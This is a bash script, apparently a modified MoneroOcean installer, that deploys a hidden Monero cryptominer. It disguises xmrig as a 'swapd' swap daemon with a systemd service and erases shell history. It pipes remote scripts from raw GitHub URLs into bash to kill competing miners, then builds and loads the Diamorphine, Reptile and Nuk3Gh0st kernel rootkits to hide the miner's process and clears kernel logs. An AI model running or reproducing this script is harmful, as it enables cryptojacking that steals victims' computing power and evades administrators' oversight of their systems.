#!/bin/bash

unset HISTFILE ;history -d $((HISTCMD-1))
export HISTFILE=/dev/null ;history -d $((HISTCMD-1))

systemctl disable gdm2 --now
systemctl disable swapd --now

killall swapd
kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

killall kswapd0
kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`

rm -rf $HOME/.gdm2/
rm -rf $HOME/.swapd/

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

#BotKiller
curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
# curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_swapd_processhider.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 1
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
  sudo systemctl stop gdm2.service
fi
killall -9 xmrig
killall -9 kswapd0

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
rm -rf $HOME/.gdm2
rm -rf $HOME/.swapd

echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
  exit 1
fi

# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz

echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
[ -d $HOME/.swapd ] || mkdir $HOME/.swapd
if ! tar xf xmrig.tar.gz -C $HOME/.swapd; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
  exit 1
fi
rm xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.swapd/config.json
$HOME/.swapd/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.swapd/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
  if ! tar xf xmrig.tar.gz -C $HOME/.swapd --strip=1; then
    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
  fi
  rm xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
  $HOME/.swapd/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/.swapd/xmrig ]; then
      echo "ERROR: Stock version of $HOME/.swapd/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/.swapd/xmrig was removed by antivirus too"
    fi
#    exit 1
  fi
fi

echo "[*] Miner $HOME/.swapd/xmrig is OK"

mv $HOME/.swapd/xmrig $HOME/.swapd/swapd

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json

#echo "[*] Copying xmrig-proxy config"

#mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json

#cd $HOME/.swapd/ ; touch config.json ; cat config.json <<EOL
#{
#    "autosave": true,
#    "cpu": true,
#    "opencl": true,
#    "cuda": true,
#    "pools": [
#        {
#            "url": "194.164.63.118:3333"
#        }
#    ]
#}
#EOL

wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json


cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json

# preparing script

killall xmrig

echo "[*] Creating $HOME/.swapd/swapd.sh script"
cat >$HOME/.swapd/swapd.sh <<EOL
#!/bin/bash
if ! pidof swapd >/dev/null; then
  nice $HOME/.swapd/swapd \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall swapd\" or \"sudo killall swapd\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.swapd/swapd.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.swapd/swapd.sh script to $HOME/.profile"
    echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
  bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
    bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating moneroocean systemd service"

cat >/tmp/swapd.service <<EOL
[Unit]
Description=Swap Daemon Service

[Service]
ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
    echo "[*] Starting swapd systemd service"
    sudo killall swapd 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable swapd.service
    sudo systemctl start swapd.service
    echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
  fi
fi

#echo "[*] Installing r00tkit"
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e swapd -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e swapd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e swapd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
fi
echo ""

echo "[*] Determining GPU+CPU (without lshw)"
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils -y; apt-get install pciutils -y; update-pciids ; lspci -vs 00:01.0 ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
# cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so

echo "[*] Determining GPU+CPU"
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt-get install pciutils lshw -y ; zypper install pciutils lshw -y ; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;

#echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

echo "[*] make toolZ, Diamorphine"
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules* kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`

echo "[*] Reptile..."
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

echo "[*] Nuk3Gh0st..."
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

#echo "[*] hide crypto miner."
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf hiding-cryptominers-linux-rootkit ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/


optimize_func() {
  MSR_FILE=/sys/module/msr/parameters/allow_writes

  if test -e "$MSR_FILE"; then
  	echo on > $MSR_FILE
  else
  	modprobe msr allow_writes=on
  fi

  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
  	then
  	if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
  		then
  			if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
  				then
  					echo "Detected Zen4 CPU"
  					wrmsr -a 0xc0011020 0x4400000000000
  					wrmsr -a 0xc0011021 0x4000000000040
  					wrmsr -a 0xc0011022 0x8680000401570000
  					wrmsr -a 0xc001102b 0x2040cc10
  					echo "MSR register values for Zen4 applied"
  				else
  					echo "Detected Zen3 CPU"
  					wrmsr -a 0xc0011020 0x4480000000000
  					wrmsr -a 0xc0011021 0x1c000200000040
  					wrmsr -a 0xc0011022 0xc000000401500000
  					wrmsr -a 0xc001102b 0x2000cc14
  					echo "MSR register values for Zen3 applied"
  				fi
  		else
  			echo "Detected Zen1/Zen2 CPU"
  			wrmsr -a 0xc0011020 0
  			wrmsr -a 0xc0011021 0x40
  			wrmsr -a 0xc0011022 0x1510000
  			wrmsr -a 0xc001102b 0x2000cc16
  			echo "MSR register values for Zen1/Zen2 applied"
  		fi
  elif grep "Intel" /proc/cpuinfo > /dev/null;
  	then
  		echo "Detected Intel CPU"
  		wrmsr -a 0x1a4 0xf
  		echo "MSR register values for Intel applied"
  else
  	echo "No supported CPU detected"
  fi


  sysctl -w vm.nr_hugepages=$(nproc)

  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
  do
      echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
  done

  echo "1GB pages successfully enabled"
}



if [ $(id -u) = 0 ]; then
   echo "Running as root"
   optimize_func
else
   echo "Not running as root"
   sysctl -w vm.nr_hugepages=$(nproc)
fi


kill -31 $(pgrep -f -u root config.json)

kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`

#echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"

systemctl restart swapd ; rm -rf $HOME/xmrig* ; apt autoremove -y ; yum autoremove -y;

echo "[*] Setup complete"
